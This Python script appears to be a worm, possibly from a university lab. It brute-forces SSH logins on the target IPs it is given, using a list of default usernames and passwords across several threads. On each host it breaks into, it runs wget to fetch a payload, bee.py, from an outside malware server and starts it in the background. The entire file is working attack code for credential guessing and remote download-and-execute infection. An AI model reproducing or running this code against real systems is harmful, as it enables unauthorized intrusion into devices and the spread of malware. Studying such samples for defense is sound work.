import sys, paramiko, socket, random, requests, json
from threading import Thread
from queue import Queue

def scan_host(host, port, r_code=1):
    try:
        s = socket(socket.AF_INET, socket.SOCK_STREAM)
        code = s.connect_ex((host, port))
        if code == 0:
            r_code = code
        s.close()
    except Exception as e:
        pass
    return r_code

def update_log(host, key, ips=None, alternative_key=None):
    global log
    if ips == None:
        ips = [host]
    for sensor in log['sensors']:
        if sensor['ip'] == host:
            if host in ips:
                sensor[key] += 1
            else:
                sensor[alternative_key] += 1
            break

def brute_force_worker(host, q, cracked, ssh_port=22, timeout=1, code=0):
    while not q.empty():
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
        username, password = q.get()
        if code == 0 or code == 1:
            try:
                ssh.connect(host, port=ssh_port, username=username, password=password, timeout=timeout)
                cracked.append((username,password))
                _, stdout, _ = ssh.exec_command('hostname -I')
                ips = stdout.readline().split(' ')
                update_log(host, 'n_connected', ips, 'n_failed')
            except paramiko.AuthenticationException:
                code = 1
                update_log(host, 'n_connected')
            except paramiko.ssh_exception.SSHException:
                code = 1
                q.put((username, password))
                print('Banner exception. Credentials will be checked again.')
            except Exception as e:
                code = -1
                print(e)
                update_log(host, 'n_failed')
        ssh.close()
        with open(log_file, 'w') as f:
            json.dump(log, f)

def ssh_infect(host, username, password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
    try:
        ssh.connect(host, port=ssh_port, username=username, password=password, timeout=1)
        stdin, stdout, stderr = ssh.exec_command('wget ' + zombie_link + ' -O /tmp/bee.py')
        exit_status = stdout.channel.recv_exit_status()
        print(exit_status)
        if exit_status == 0:
            stdin, stdout, stderr = ssh.exec_command('python3 /tmp/bee.py &')
            exit_status = stdout.channel.recv_exit_status()
            if exit_status == 0:
                pass
        _, stdout, _ = ssh.exec_command('hostname -I')
        ips = stdout.readline().split(' ')
        update_log(host, 'n_connected', ips, 'n_failed')
    except paramiko.AuthenticationException:
        code = 1
        update_log(host, 'n_failed')
    except Exception as e:
        print(e)
        code = -1
        update_log(host, 'n_failed')
    ssh.close()
    return code

if __name__ == '__main__':

    targets = sys.argv[1].split(',')
    log = {'sensors': []}
    for device in targets:
        log['sensors'].append({'ip': device, 'n_connected': 0, 'n_failed': 0})
    log_file = '/tmp/malware_activity'
    n_workers = 5
    zombie_link = 'http://malware.server.jyu.fi/download/bee.py'
    ssh_port = 22
    http_port = 80
    if len(sys.argv) <= 3:
        user_passwords = [
            ('666666', '666666'),
            ('888888', '888888'),
            ('admin', 'password'),
            ('admin1', 'password'),
            ('administrator', '1234'),
            ('Administrator', 'admin'),
            ('guest', '12345'),
            ('mother', 'fucker'),
            ('service', 'service'),
            ('supervisor', 'supervisor'),
            ('support', 'support'),
            ('tech', 'tech'),
            ('ubnt', 'ubnt'),
            ('ubuntu', 'ubuntu'),
            ('user', 'user')
        ]
    elif len(sys.argv) >= 3 and sys.argv[2] == 'pswd_known':
        user_passwords = [
            ('ubuntu', 'ubuntu')
        ]

    # infect other devices

    n_workers = 5
    for i in range(len(targets)):
        ip = targets[i]
        print('Infecting ' + ip)
        cracked = []
        q = Queue()
        for user_pass in user_passwords:
            q.put(user_pass)
        workers = [Thread(target=brute_force_worker, args=(ip, q, cracked)) for w in range(n_workers)]
        for w in range(n_workers):
            workers[w].start()
        for w in range(n_workers):
            workers[w].join()
        print(cracked)
        if cracked:
            username,password = random.choice(cracked)
            resp = ssh_infect(ip, username, password)